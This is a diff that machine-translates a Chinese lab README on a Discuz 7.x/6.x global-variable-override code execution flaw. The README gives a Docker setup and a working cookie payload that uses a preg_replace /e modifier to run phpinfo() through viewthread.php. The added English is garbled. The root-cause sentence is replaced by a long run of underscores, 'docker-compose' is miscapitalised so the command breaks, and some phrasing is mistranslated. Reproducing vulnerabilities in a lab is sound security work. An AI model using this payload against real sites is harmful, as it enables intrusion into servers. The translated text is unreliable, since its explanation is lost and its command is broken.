@@ -1,26 +1,26 @@
-# Discuz 7.x/6.x 全局变量防御绕过导致代码执行
+# Discuz 7.x/6.x Global Variable Defense Bypass Causes Code Execution
 
-由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`，我们通过在Cookie中传入`$GLOBALS`来覆盖全局变量，造成代码执行漏洞。
+Since the default value of `request_order` in the php.ini version of php5.3.x is GP, ``_______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________ Variables that cause code execution vulnerabilities.
 
-具体原理请参考：
+For details, please refer to:
 
 - https://www.secpulse.com/archives/2338.html
 
-## 漏洞环境
+## vulnerability environment
 
-执行如下命令启动Discuz 7.2：
+Run the following command to start Discuz 7.2:
 
 ```
-docker-compose up -d
+Docker-compose up -d
 ```
 
-启动后，访问`http://your-ip:8080/install/`来安装discuz，数据库地址填写`db`，数据库名为`discuz`，数据库账号密码均为`root`。
+After startup, visit `http://your-ip:8080/install/` to install discuz, fill in the database address `db`, the database name is `discuz`, and the database account password is `root`.
 
 ![](1.png)
 
-## 漏洞复现
+## Vulnerability recurrence
 
-安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加`GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`：
+After the installation is successful, directly find an existing post, send a packet to it, and add `GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray ]=phpinfo();`:
 
 ```
 GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
@@ -35,8 +35,8 @@ Connection: close
 
 ```
 
-可见，phpinfo已成功执行：
+Visible, phpinfo has been successfully executed:
 
 ![](2.png)
 
-> 网上文章说需要一个带表情评论的帖子，实际测试发现并不需要，这块仍需阅读代码来解释原因。
+> The online article says that you need a post with an emoticon. The actual test found that you don't need it. You still need to read the code to explain why.
